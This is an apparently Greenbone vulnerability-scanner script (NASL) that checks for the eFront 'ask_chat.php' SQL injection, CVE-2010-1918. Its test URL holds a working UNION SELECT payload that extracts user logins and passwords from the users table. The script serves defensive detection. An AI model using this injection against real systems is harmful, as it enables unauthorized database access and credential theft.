# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:efrontlearning:efront";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800778");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2010-05-19 14:50:39 +0200 (Wed, 19 May 2010)");
  script_cve_id("CVE-2010-1918");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("eFront 'ask_chat.php' SQLi Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_efront_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("efront/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view,
  add, modify or delete information in the back-end database.");

  script_tag(name:"affected", value:"eFront version 3.6.2 and prior.");

  script_tag(name:"insight", value:"The flaw exists due to an error in 'ask_chat.php', which fails
  to properly sanitise input data passed via the 'chatrooms_ID' parameter.");

  script_tag(name:"solution", value:"Upgrade to eFront 3.6.2 build 6551 or later.");
  script_tag(name:"summary", value:"eFront is prone to an SQL injection (SQLi) vulnerability.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/39728");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40032");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/1101");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1005-exploits/MOPS-2010-018.pdf");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/ask_chat.php?chatrooms_ID=0%20UNION%20select%20concat%28login,0x2e,password%29,1,1,1,1%20from%20users%20--%20x";

if( http_vuln_check( port:port, url:url, pattern:"0 UNION select concat\(login,0x2e,password\)", extra_check:"admin", check_header:TRUE ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
